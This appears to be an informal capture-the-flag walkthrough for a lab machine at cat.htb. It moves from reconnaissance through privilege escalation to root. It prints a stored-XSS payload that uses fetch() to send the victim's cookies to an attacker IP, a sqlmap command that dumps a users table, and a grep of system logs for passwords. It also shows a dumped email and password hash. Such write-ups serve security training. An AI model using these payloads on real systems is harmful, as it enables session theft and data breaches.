Started with a nmap scan
```
22 OpenSSH 8.2p1 Ubuntu
80 Apache 2.4.41
```
The nmap scan shows that the webserver redirects to a domain `http://cat.htb/` looking around the site we can make a account and vote to a cat there is also a `.git` folder and we can use gitdumper to dump it looking at the source code there is a hardcoded admin user `axel` testing register page for sql injection  while I was testing parts of the site I was trying to crack the login for the user `axel` and it cracked after a while I gave up on this going back and testing xss we got a hit with the `contest.php` we can add are payload at the end of the image 
`<script>fetch('http://10.10.14.248/cookie?cookie=' + encodeURIComponent(document.cookie));</script>` 
and now we have the cookie for axel and now we can access the admin page and accept or deny cats so testing for sql injection agin and found the `catName` parameter is vulnerable 
`sqlmap -r req -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users --dump`
and we get a user with a hash `rosamendoza485@gmail.com:ac369922d560f17d6eeb8b2c7dec498c` and we could crack the user and SSH into the machine as `rosa` and checked for sudo prives and we don't have any so gonna run linpeas now and I also ran this command `grep -Ri pass /var/log` and found a password and found a password in the apache log files for axel user running linpeas agin we can see are user has some mail so when reading the e-mail from rosa says there is a gittea service running on port `3000` so now we need to port forward that port to are host and its running version `1.22.0` and we can use the same creds to login to the user `axel` and there is a XSS exploit and we can use this to send us the creds for the root login  